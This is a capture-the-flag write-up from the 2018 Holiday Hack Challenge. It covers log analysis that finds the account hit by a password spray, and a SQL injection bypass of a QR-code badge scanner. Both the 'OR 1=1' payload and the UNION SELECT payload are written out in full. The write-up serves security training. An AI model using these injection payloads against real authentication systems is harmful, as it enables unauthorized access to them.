## Objective 6

> Bypass the authentication mechanism associated with the room near Pepper Minstix. A [sample employee badge](https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg) is available. What is the access control number revealed by the [door authentication panel](https://scanomatic.kringlecastle.com/index.html)? 
> For hints on achieving this objective, please visit Pepper Minstix and help her with the Yule Log Analysis Cranberry Pi terminal challenge.

### Challenge


> Bad guys have us tangled up in pepperminty kelp!
> "Password spraying" is to blame for this our grinchly fate.
> Should we blame our password policies which users hate?
> Here you'll find a web log filled with failure and success.
> One successful login there requires your redress.
> Can you help us figure out which user was attacked?
> Tell us who fell victim, and please handle this with tact...

> Submit the compromised webmail username to 
> runtoanswer to complete this challenge.

For this challenge you will need:

- MailSniper: https://securityweekly.com/2017/07/21/tsw11/


Ok, we have an event dump and a tool:
```
elf@b9143cb5db8c:~$ ls
evtx_dump.py  ho-ho-no.evtx  runtoanswer
```

Let's tinker a little:
```
elf@b9143cb5db8c:~$ evtx_dump.py  --help
usage: evtx_dump.py [-h] evtx

Dump a binary EVTX file into XML.

positional arguments:
  evtx        Path to the Windows EVTX event log file

optional arguments:
  -h, --help  show this help message and exit


elf@b9143cb5db8c:~$ evtx_dump.py ho-ho-no.evtx | head -n 40
<?xml version="1.1" encoding="utf-8" standalone="yes" ?>

<Events>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"></Provider>
<EventID Qualifiers="">4647</EventID>
<Version>0</Version>
<Level>0</Level>
<Task>12545</Task>
<Opcode>0</Opcode>
<Keywords>0x8020000000000000</Keywords>
<TimeCreated SystemTime="2018-09-10 12:18:26.972103"></TimeCreated>
<EventRecordID>231712</EventRecordID>
<Correlation ActivityID="{fd18dc13-48f8-0001-58dc-18fdf848d401}" RelatedActivityID=""></Correlation>
<Execution ProcessID="660" ThreadID="752"></Execution>
<Channel>Security</Channel>
<Computer>WIN-KCON-EXCH16.EM.KRINGLECON.COM</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data Name="TargetUserSid">S-1-5-21-25059752-1411454016-2901770228-500</Data>
<Data Name="TargetUserName">Administrator</Data>
<Data Name="TargetDomainName">EM.KRINGLECON</Data>
<Data Name="TargetLogonId">0x0000000000969b09</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"></Provider>
<EventID Qualifiers="">4826</EventID>
<Version>0</Version>
<Level>0</Level>
<Task>13573</Task>
<Opcode>0</Opcode>
[cut]
```

We have some interesting fields, like EventID, TargetUsername, IpAddress etc...
A password spray attack should generate logon failures, let's see some numbers:

```
elf@b9143cb5db8c:~$ evtx_dump.py ho-ho-no.evtx | grep -i EventID | sort | uniq -c | sort         
      1 <EventID Qualifiers="">4608</EventID>
      1 <EventID Qualifiers="">4647</EventID>
      1 <EventID Qualifiers="">4826</EventID>
      1 <EventID Qualifiers="">4902</EventID>
      1 <EventID Qualifiers="">5024</EventID>
      1 <EventID Qualifiers="">5033</EventID>
      2 <EventID Qualifiers="">4724</EventID>
      2 <EventID Qualifiers="">4738</EventID>
      2 <EventID Qualifiers="">4904</EventID>
      2 <EventID Qualifiers="">5059</EventID>
     10 <EventID Qualifiers="">4688</EventID>
     34 <EventID Qualifiers="">4799</EventID>
     45 <EventID Qualifiers="">4768</EventID>
    108 <EventID Qualifiers="">4776</EventID>
    109 <EventID Qualifiers="">4769</EventID>
    212 <EventID Qualifiers="">4625</EventID>
    756 <EventID Qualifiers="">4624</EventID>
```

212 Events with ID 4625, which stands for `An account failed to log on.`
With a crude grep we can see the password spray attack:

```
evtx_dump.py ho-ho-no.evtx | grep 4625 -A 20 | grep UserName | sort | uniq -c  

    212 <Data Name="SubjectUserName">WIN-KCON-EXCH16$</Data>
      1 <Data Name="TargetUserName">aaron.smith</Data>
      1 <Data Name="TargetUserName">abhishek.kumar</Data>
      1 <Data Name="TargetUserName">adam.smith</Data>
      1 <Data Name="TargetUserName">ahmed.ali</Data>
      1 <Data Name="TargetUserName">ahmed.hassan</Data>
      1 <Data Name="TargetUserName">ahmed.mohamed</Data>
      1 <Data Name="TargetUserName">ajay.kumar</Data>
      1 <Data Name="TargetUserName">alex.smith</Data>
[cut]
```

What is the source of the attack? We can filter on the `IpAddress`:
```
elf@22953d27aeb7:~$ evtx_dump.py ho-ho-no.evtx | grep 4625 -A 50 | grep -i ipaddr | sort | uniq -c | sort
      1 <Data Name="IpAddress">10.158.210.210</Data>
    211 <Data Name="IpAddress">172.31.254.101</Data>
```

Bingo! We have one probably legitimate logon failure and 211 failures from a specific Ip.

Now we need to find any username which has **successfully** logged on from the attaccker's ip address: 
```
elf@22953d27aeb7:~$ evtx_dump.py ho-ho-no.evtx | grep 4624 -A 50 | grep "172.31.254.101" -B 50 | grep "TargetUserName"
<Data Name="TargetUserName">minty.candycane</Data>
<Data Name="TargetUserName">minty.candycane</Data>
```


There you go:
```
elf@22953d27aeb7:~$ runtoanswer 
Loading, please wait......



Whose account was successfully accessed by the attacker's password spray? minty.candycane


MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMXO0NMxl0MXOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMxlllooldollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMW0OKWMMNKkollldOKWMMNKOKMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXollox0NMMMxlOMMMXOdllldWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMWXOdlllokKxlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMNkkXMMMMMMMMMMMWKkollllllldkKWMMMMMMMMMMM0kOWMMMMMMMMMMMM
MMMMMMWKXMMMkllxMMMMMMMMMMMMMMMXOold0NMMMMMMMMMMMMMMMollKMMWKKWMMMMMM
MMMMMMdllKMMkllxMMMMMMMMMMMMN0KNMxl0MN00WMMMMMMMMMMMMollKMMOllkMMMMMM
Mkox0XollKMMkllxMMMMMMMMMMMMxllldoldolllOMMMMMMMMMMMMollKMMkllxXOdl0M
MMN0dllll0MMkllxMMMMMMMMMMMMMN0xolllokKWMMMMMMMMMMMMMollKMMkllllx0NMM
MW0xolllolxOxllxMMNxdOMMMMMWMMMMWxlOMMMMWWMMMMWkdkWMMollOOdlolllokKMM
M0lldkKWMNklllldNMKlloMMMNolok0NMxl0MX0xolxMMMXlllNMXolllo0NMNKkoloXM
MMWWMMWXOdlllokdldxlloWMMXllllllooloollllllWMMXlllxolxxolllx0NMMMNWMM
MMMN0kolllx0NMMW0ollll0NMKlloN0kolllokKKlllWMXklllldKMMWXOdlllokKWMMM
MMOllldOKWMMMMkollox0OdldxlloMMMMxlOMMMNlllxoox0Oxlllo0MMMMWKkolllKMM
MMW0KNMMMMMMMMKkOXWMMMW0olllo0NMMxl0MWXklllldXMMMMWKkkXMMMMMMMMX0KWMM
MMMMMMMMMMMMMMMMMMMW0xollox0Odlokdlxxoox00xlllokKWMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMWollllOWMMMMNklllloOWMMMMNxllllxMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMN0xlllokK0xookdlxxookK0xollokKWMMMMMMMMMMMMMMMMMMM
MMWKKWMMMMMMMMKk0XMMMMW0ollloOXMMxl0MWKklllldKWMMMWXOOXMMMMMMMMNKKMMM
MMkllldOXWMMMMklllok00xoodlloMMMMxlOMMMNlllxook00xollo0MMMMWKkdlllKMM
MMMN0xollox0NMMW0ollllONMKlloNKkollldOKKlllWMXklllldKWMMX0xlllok0NMMM
MMWWMMWKkollldkxlodlloWMMXllllllooloollllllWMMXlllxooxkollldOXMMMWMMM
M0lldOXWMNklllldNMKlloMMMNolox0XMxl0WXOxlldMMMXlllNMXolllo0WMWKkdloXM
MW0xlllodldOxllxMMNxdOMMMMMNMMMMMxlOMMMMWNMMMMWxdxWMMollkkoldlllokKWM
MMN0xllll0MMkllxMMMMMMMMMMMMMNKkolllokKWMMMMMMMMMMMMMollKMMkllllkKWMM
MkldOXollKMMkllxMMMMMMMMMMMMxlllooloolll0MMMMMMMMMMMMollKMMkllxKkol0M
MWWMMMdllKMMkllxMMMMMMMMMMMMXO0XMxl0WXOONMMMMMMMMMMMMollKMMOllkMMMWMM
MMMMMMNKKMMMkllxMMMMMMMMMMMMMMMN0oldKWMMMMMMMMMMMMMMMollKMMWKKWMMMMMM
MMMMMMMMMMMMXkxXMMMMMMMMMMMWKkollllllldOXMMMMMMMMMMMM0xkWMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMX0xlllok0xlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXollldOXMMMxlOMMWXOdllldWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMW0OKWMMWKkollldOXWMMN0kKMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMklllooloollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMXOOXMxl0WKOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM

Silly Minty Candycane, well this is what she gets.
"Winter2018" isn't for The Internets.
Passwords formed with season-year are on the hackers' list.
Maybe we should look at guidance published by the NIST?

Congratulations!
```




**Hint**: SQL Injection for authentication bypass: https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#Auth_Bypass

**Hint**: QR Code online generator: https://www.the-qrcode-generator.com/


### Objective completion

Ok, we have a user badge with a QR code and a web page with a camera scanner or a USB stick (which accepts PNG images).
Remember to **alwyas** keep the browser's debug console open!

The first try is to pass the QR code from Alabaster's badge: 

![alabaster_badge.jpg](https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/6/alabaster_badge.jpg)

I use [Lightshot](https://app.prntscr.com/) to capture and save the QR as `alabaster_qr_code.png` then pass it to the scanner via USB but: **Authorized User Account Has Been Disabled!**

The message is returned by the server via json:

```
POST https://scanomatic.kringlecastle.com/upload
Form data: barcode (binary)

Return value:
{"data":"Authorized User Account Has Been Disabled!","request":false}
```

What's in the QR code? We can upload it [here](https://online-barcode-reader.inliteresearch.com/) and decode it to `
oRfjg5uGHmbduj2m`: that's not HEX nor base64, that's probably a user ID which is used in the backend to authenticate.

Following the hint, it's time to test for SQL Injection! We'll [craft](https://www.patrick-wied.at/static/qrgen/) some new QR code and try to figure out the authentication process and bypass it.

First test: inject something to throw an error, for instance `'someRandomStuff+`

![syntax_error_qr_code.png](https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/6/syntax_error_qr_code.png)

and pass it to the scanner:

```
{"data":"EXCEPTION AT (LINE 96 \"user_info = query(\"SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1\".format(uid))\"): (1064, u\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'someRandomStuff' LIMIT 1' at line 1\")","request":false}
```

Good, the site does not check for SQL injections and we know how the backend authenticates the user:
```
SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1
```

Commented version:
```
SELECT
  first_name,        
  last_name,
  enabled               <- Alabaster is not enabled, remember the error from the first test?
FROM
  employees
WHERE
  authorized = 1        <- Alabaster is authorized
  AND uid = '{}'        <- the user id, 'oRfjg5uGHmbduj2m' for Alabaster
LIMIT
  1                     <- Returns only one row
```

**Important**: we can inject SQL only here `AND uid = '{}'`, replacing the curly brakets, and we need to correctly match the single quotes.


From the owasp hint, the classic authentication bypass is `OR 1=1`, something like:
```
Injected:         'OR '1'='1
Resulting query:  SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = ''OR '1'='1' LIMIT 1
```

The `OR 1=1` technique inject an always true WHERE clause, in OR with the other clauses: 
```
SELECT
  first_name,       
  last_name,
  enabled           <- mind here!
FROM
  employees
WHERE
  authorized = 1    <- we need an auhtorized guy
  AND uid = ''      <- no one
  OR '1' = '1'      <- always true
LIMIT
  1                 <- returns only one row
```

This query will return a single row (because of `LIMIT`) with an authorized user, the first found. We don't know if the returned user is also enabled, but it's worth a shot (see `one_eq_one_qr_code.png`):

```
{"data":"Authorized User Account Has Been Disabled!","request":false}
```

but the returned account is not enabled!
We need to inject not a where clause but a **new** select, to pick up an enabled account. Also, because of the `LIMIT 1` we need to be sure that only out injected select returns data.

We need a [UNION](https://www.w3schools.com/sql/sql_union.asp) SELECT:

> The UNION operator is used to combine the result-set of two or more SELECT statements.

> Each SELECT statement within UNION must have the same number of columns
> The columns must also have similar data types
> The columns in each SELECT statement must also be in the same order

Our select will be something like:
```
SELECT              <- select the same columns of the first select
  first_name,       
  last_name,
  enabled           
FROM
  employees
WHERE
  authorized = 1    <- we need an auhtorized guy
  AND enabled = 1   <- and he must be enabled
```

We need to assemble the injection considering all of this:
- we need to match and close the single quotes
- we need to be sure that the first select returns nothing
- we need to correctly use UNION

Use a [SQL validator](https://www.eversql.com/sql-syntax-check-validator/) to be sure of the result, this is the injection string:

```
' UNION SELECT first_name,last_name,enabled from employees where authorized = 1 and enabled = '1
```

The first single quote of the injection keeps us sure to "void" the original select by setting the WHERE clause to `AND uid = ''`.
The last single quote will match the closing single quote of the original SQL, enclosing the '1' of our `and enabled` clause.   

The resulting query is valid and seems to fit our purpose:

```
SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '' UNION SELECT first_name,last_name,enabled from employees where authorized = 1 and enabled = '1' LIMIT 1

Expanded:

SELECT
  first_name,
  last_name,
  enabled
FROM
  employees
WHERE
  authorized = 1
  AND uid = ''
UNION
SELECT
  first_name,
  last_name,
  enabled
from
  employees
where
  authorized = 1
  and enabled = '1'
LIMIT
  1
```

Craft it (see `bypass_qr_code.png`) and pass it to the scanner: **User Access Granted**

And in the json response there's the required control number: 

```
{"data":"User Access Granted - Control number 19880715","request":true,"success":{"hash":"ff60055a84873cd7d75ce86cfaebd971ab90c86ff72d976ede0f5f04795e99eb","resourceId":"false"}}
```


**Objective answer**: `19880715`


